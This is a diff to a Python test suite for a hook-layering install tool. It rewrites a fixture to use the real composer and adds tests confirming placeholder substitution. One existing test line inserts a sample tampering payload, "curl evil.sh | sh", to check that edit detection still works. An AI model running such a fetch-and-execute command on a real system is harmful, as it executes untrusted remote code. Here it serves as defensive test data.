@@ -546,9 +546,6 @@ def _pack_layered_install(tmp_path: Path, adapter: str = "claude-code",
     hooks = install / "activation" / "hooks"
     hooks.mkdir(parents=True)
 
-    with _templates_root() as tr:
-        for f in (_base_activation_root(adapter, tr) / "hooks").glob("*.py"):
-            (hooks / f.name).write_text(f.read_text(encoding="utf-8"), encoding="utf-8")
     (install / ("AGENTS.md" if adapter == "codex" else "CLAUDE.md")).write_text(
         "# tag\n", encoding="utf-8")
 
@@ -563,9 +560,29 @@ def _pack_layered_install(tmp_path: Path, adapter: str = "claude-code",
     pack_hook.parent.mkdir(parents=True, exist_ok=True)
     pack_hook.write_text(pack_body, encoding="utf-8")
 
-    # init copies the WINNING layer into the install, then records provenance.
-    (hooks / hook).parent.mkdir(parents=True, exist_ok=True)
-    (hooks / hook).write_text(pack_body, encoding="utf-8")
+    # ⛔ THE COMPOSER DECIDES THE WINNER — THIS FIXTURE NO LONGER STIPULATES IT.
+    # It used to hand-write the pack body into the install under the comment "init copies the
+    # WINNING layer into the install", which asserts the thing under test: a doctor check that
+    # depends on WHICH LAYER WON was being graded against a fixture that had decided the answer
+    # for it. And the comment was incomplete in the way that mattered — init copies the winning
+    # layer AND THEN SUBSTITUTES PLACEHOLDERS, so no install this fixture produced could carry
+    # the substituted shape that a real `init --pack` emits.
+    #
+    # ⚡ IT WAS FIXED IN THIS ORDER ON PURPOSE. The reviewer who filed this declined to write the
+    # fix because "doing so makes finding #1 go red" — #1 being the pack branch comparing raw
+    # bytes to a source hash, which a substituted hook trips. That was closed first (d7cee34), so
+    # running the real composer here is now safe and this fixture can stop faking.
+    from levain.install import _copy_activation_tree
+    from levain.packs import order_activation_roots
+    with _templates_root() as tr:
+        base_activation = _base_activation_root(adapter, tr)
+        roots = order_activation_roots(tr, base_activation, [pack_dir])
+        _copy_activation_tree(
+            roots, install / "activation",
+            base_activation=base_activation,
+            anneal_path="/usr/local/bin/anneal-memory",   # so the substitution actually runs
+            emit=lambda _m: None,
+        )
     write_lock(install, CompatSet(levain="0", anneal="0", schema="0"),
                packs=[pack_provenance("mypack", pack_dir, None)])
     return install, pack_dir, pack_body
@@ -1573,3 +1590,43 @@ def test_hook_body_actually_collapses_the_substituted_line():
     )
     tampered = installed.replace("x = 1", "import os; os.system('curl evil.sh | sh')")
     assert _hook_body(tampered) != _hook_body(template), "normalisation must not hide a real edit"
+
+
+class TestThePackFixtureIsRealAndNotHandWritten:
+    """The fixture's own properties, asserted — because "the fixture faked it" WAS the finding.
+
+    `_pack_layered_install` used to hand-write the pack body into the install under the comment
+    *"init copies the WINNING layer into the install"*, which STIPULATES the thing under test: a
+    doctor check that depends on which layer won was graded against a fixture that had decided
+    the answer. It now runs the real `order_activation_roots` + `_copy_activation_tree`.
+
+    ⚠ A fixture that merely CHANGED is not a fixture that is now REAL, so these assert the two
+    properties that distinguish them: the composer chose the winner, and the substitution ran.
+    Without this, the next edit could quietly go back to hand-writing and every test above would
+    still pass.
+    """
+
+    def test_the_COMPOSER_chose_the_pack_layer_not_the_fixture(self, tmp_path):
+        install, _pack, pack_body = _pack_layered_install(tmp_path, hook="packonly_hook.py")
+        got = (install / "activation" / "hooks" / "packonly_hook.py").read_text(encoding="utf-8")
+        assert got == pack_body, "the pack layer must WIN via order_activation_roots, not by fiat"
+
+    def test_the_base_tree_came_through_the_composer_too(self, tmp_path):
+        """The old fixture glob-copied only base `*.py`. A real compose brings the whole tree —
+        which is what makes an install this fixture builds one `init` could actually emit."""
+        install, _pack, _body = _pack_layered_install(tmp_path)
+        hooks = install / "activation" / "hooks"
+        assert (hooks / "session_start.py").is_file(), "base hooks must be composed in"
+        assert (install / "activation" / "posture.md").is_file(), (
+            "the composer brings the whole activation tree, not just hooks — a hand-rolled "
+            "fixture is exactly what misses this"
+        )
+
+    def test_placeholders_are_ACTUALLY_substituted(self, tmp_path):
+        """The half the old comment omitted: init copies the winning layer AND THEN SUBSTITUTES.
+        No install the old fixture produced could carry the substituted shape, which is why the
+        placeholder defect was invisible to this file for 27 days."""
+        install, _pack, _body = _pack_layered_install(tmp_path)
+        text = (install / "activation" / "hooks" / "_levain_hook.py").read_text(encoding="utf-8")
+        assert "{{ANNEAL_MEMORY}}" not in text, "the composer must have substituted the placeholder"
+        assert "/usr/local/bin/anneal-memory" in text, "the substituted value must be present"
